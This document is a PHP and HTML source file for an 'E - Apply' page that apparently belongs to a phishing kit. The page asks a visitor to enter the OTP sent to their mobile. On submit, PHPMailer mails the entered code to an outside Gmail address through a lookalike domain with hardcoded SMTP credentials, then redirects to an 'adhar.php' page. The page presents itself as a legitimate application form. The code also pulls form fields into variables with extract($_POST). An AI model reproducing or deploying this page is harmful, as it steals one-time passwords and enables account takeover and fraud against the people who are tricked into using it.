<?php
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
$msg="";
extract($_POST);
session_start();
if(isset($_POST['submit'])){
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'Enquiry';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>OTP</b> - '.$otp.'</p>';
                
                if(!($mail->Send()))
                {
                   // header("Location:resi.php");
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                   
                        header("Location:adhar.php");    
                     
                }           
    
  
}
?>
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>E - Apply</title>
  <link rel="stylesheet" href="./style.css">
<style type="text/css">
form p {
  font-size: 120%;
}
input[type=text]{
  margin: 0 0 0px 0 !important;
}
.input-field{
  margin-top: 4px !important;
}
[type="checkbox"]{
  color: #02b1f2 !important;
}
button{
  width: 100%;
  border-radius: 50px !important;
  font-size: 18px !important; 
  background: #02b1f2 !important;
}
.ctrlqFormContent {
  color: rgba(0,0,0,.87);
  padding: 0px;
}

.ctrlqFormContentWrapper {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flex;
  display: -ms-flexbox;
  display: flex;
  -webkit-box-orient: vertical;
  box-orient: vertical;
  -webkit-flex-direction: column;
  flex-direction: column
}
.ctrlqCenteredContent {
  margin: auto;
  width: 600px; 
}
.ctrlqHeaderTitle {
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  font-size: 34px;
  line-height: 135%;
  max-width: 100%;
  min-width: 0%;
  margin-bottom: 22px
}

@media (max-width: 660px) {
  .ctrlqHeaderMast {
    height: 53px;
  }
  .ctrlqFormCard:first-of-type {
    margin-top: -50px;
  }

  .ctrlqCenteredContent {
    width: 100%;
  }
}

div.error {
  position: relative;
  top: -1rem;
  left: 0rem;
  font-size: 0.8rem;
  color: #FF4081;
  -webkit-transform: translateY(0%);
  -ms-transform: translateY(0%);
  -o-transform: translateY(0%);
  transform: translateY(0%);
}
input{
  border-bottom: none !important;
  font-size: 22px !important
}
input[type=text]:focus:not([readonly]){
  box-shadow: none !important;
  border: none !important;
  border-bottom: none !important; 
}
@media only screen and (min-width: 720px){
  .desktoppdd{
    letter-spacing: 40px !important;
    padding-left: 12px !important;
  }
}
</style>
</head>
<body>
<!-- partial:index.partial.html -->
<lhtml>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <title>E - Apply</title>
  </head>
  <body>
    <div class="ctrlqFormContentWrapper">
      <div class="ctrlqHeaderMast"></div>
      <div class="ctrlqCenteredContent">
        <div class="ctrlqFormCard">
          <div class="ctrlqFormContent">
            <div style="padding: 0; margin: 0;">
            <img style="width: 100%;" src="img/header2.jpg">
          </div><br><br>
            <div style="text-align: center;">
              <img style="width: 75px;" src="img/e70a1d5970e83d359eac21962b60013b.svg">
            </div>
            <form method = "post">  

              <div class="row">
                <div class="input-field col s12"><br>
                  <h6 style="text-align: center; font-size: 18px;"><b>Enter OTP</b></h6>
                  <a href="#"><h5 style="color: #bebfc0; font-family: Lato,sans-serif; font-size: 15px; line-height: 18px; letter-spacing: 0; text-align: center;"><span>Please enter OTP sent to your mobile <br> number</span>+91-XXXXXX<?=substr($_SESSION['mobile'],6,10)?> <span>for verification</span></h5></a>

                  <div class="row">
                    <div class="col s3"></div>
                    <div class="col s6">
                      <input required="" type="text" name="otp" maxlength = "6" class="desktoppdd" style="letter-spacing: 15px; padding-left: 7px;">
                      <div style="width: 12%; margin-left: 4%; height: 1px; background: rgba(0,0,0,.87); float: left;"></div>
                      <div style="width: 12%; margin-left: 4%; height: 1px; background: rgba(0,0,0,.87); float: left;"></div>
                      <div style="width: 12%; margin-left: 4%; height: 1px; background: rgba(0,0,0,.87); float: left;"></div>
                      <div style="width: 12%; margin-left: 4%; height: 1px; background: rgba(0,0,0,.87); float: left;"></div>
                      <div style="width: 12%; margin-left: 4%; height: 1px; background: rgba(0,0,0,.87); float: left;"></div>
                      <div style="width: 12%; margin-left: 4%; height: 1px; background: rgba(0,0,0,.87); float: left;"></div>
                    </div>
                  </div>
                  <a href="#"><h6 style="text-align: center; text-decoration: underline; color: #861F41; display: none;">Resend Code</h6></a><br>
                  <!-- <a href="#"><h6 style="text-align: center; text-decoration: underline;">Cancel</h6></a> -->
                  <input style="width: 100%; position: fixed; bottom: 0; left: 0; font-size: 18px !important; background: #9f3339 !important; color: #fff; border: none; padding: 20px;"  type = "submit" name = "submit">
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.min.js"></script>

  </body>

  </html>

</body>
</html>
